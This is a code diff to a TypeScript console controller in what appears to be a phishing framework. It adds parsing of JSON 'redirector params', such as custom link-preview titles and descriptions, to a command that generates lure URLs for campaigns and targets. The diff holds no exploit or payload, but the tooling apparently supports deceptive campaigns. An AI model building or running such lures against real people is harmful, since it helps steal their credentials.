@@ -1,5 +1,5 @@
 import { DIContainer } from '@famir/common'
-import { LureModel } from '@famir/database'
+import { LureModel, RedirectorParams, redirectorParamsSchema } from '@famir/database'
 import { Logger, LOGGER } from '@famir/logger'
 import {
   REPL_SERVER_ASSETS,
@@ -7,6 +7,7 @@ import {
   ReplServerAssets,
   ReplServerRouter,
 } from '@famir/repl-server'
+import { TEMPLATER, Templater } from '@famir/templater'
 import { Validator, VALIDATOR } from '@famir/validator'
 import { BaseController } from '../base/index.js'
 import {
@@ -52,6 +53,7 @@ export class LureController extends BaseController {
         new LureController(
           c.resolve<Validator>(VALIDATOR),
           c.resolve<Logger>(LOGGER),
+          c.resolve<Templater>(TEMPLATER),
           c.resolve<ReplServerAssets>(REPL_SERVER_ASSETS),
           c.resolve<ReplServerRouter>(REPL_SERVER_ROUTER),
           c.resolve<LureService>(LURE_SERVICE)
@@ -74,18 +76,20 @@ export class LureController extends BaseController {
    *
    * @param validator - The validator instance.
    * @param logger - The logger instance.
-   * @param assets - The repl-server assets instance.
-   * @param router - The repl-server router instance.
+   * @param templater - The templater instance.
+   * @param assets - The assets instance.
+   * @param router - The router instance.
    * @param lureService - The lure service instance.
    */
   constructor(
     validator: Validator,
     logger: Logger,
+    templater: Templater,
     assets: ReplServerAssets,
     router: ReplServerRouter,
     protected readonly lureService: LureService
   ) {
-    super(validator, logger, assets, router)
+    super(validator, logger, templater, assets, router)
 
     this.validator
       .addSchema('console-create-lure-args', createLureArgsSchema)
@@ -94,6 +98,7 @@ export class LureController extends BaseController {
       .addSchema('console-delete-lure-args', deleteLureArgsSchema)
       .addSchema('console-list-lures-args', listLuresArgsSchema)
       .addSchema('console-make-lure-url-args', makeLureUrlArgsSchema)
+      .addSchema('console-lure-params', redirectorParamsSchema)
   }
 
   /**
@@ -273,12 +278,12 @@ export class LureController extends BaseController {
     this.router.addCommand<MakeLureUrlArgs>(
       {
         name: 'lure-make-url',
-        description: `Makes the lure URL with optional params.`,
+        description: `Makes the lure URL with redirector params.`,
         schemaName: 'console-make-lure-url-args',
         options: [
           {
             name: 'params',
-            description: `The params to use.`,
+            description: `The redirector params to use as JSON string.`,
             type: 'string',
             alias: 'p',
           },
@@ -289,21 +294,33 @@ export class LureController extends BaseController {
         console.log(
           `// Makes a URL for the 'test' lure in the 'hackernews' campaign via 'root' target:`
         )
-        console.log(`.${spec.name} hackernews test root --params "{\\"foo\\": \\"bar\\"}"\n`)
+        console.log(
+          `.${spec.name} hackernews test root -p '{"og_title":"Boom!", "og_description":"BOOM!"}'`
+        )
       },
       async (console, spec, args) => {
         const [campaignId, lureId, targetId] = args._
+
+        const params = this.parseParams(args.params)
 
         const url = await this.lureService.makeUrl({
           campaignId,
           lureId,
           targetId,
-          params: {},
+          params,
         })
 
-        console.log(`Lure URL: ${url}`)
+        console.log(url)
       }
     )
+  }
+
+  private parseParams(json: string): RedirectorParams {
+    const params = this.decodeJson(json)
+
+    this.validateData<RedirectorParams>('console-lure-params', params)
+
+    return params
   }
 
   private showLureModel(console: Console, lure: LureModel) {
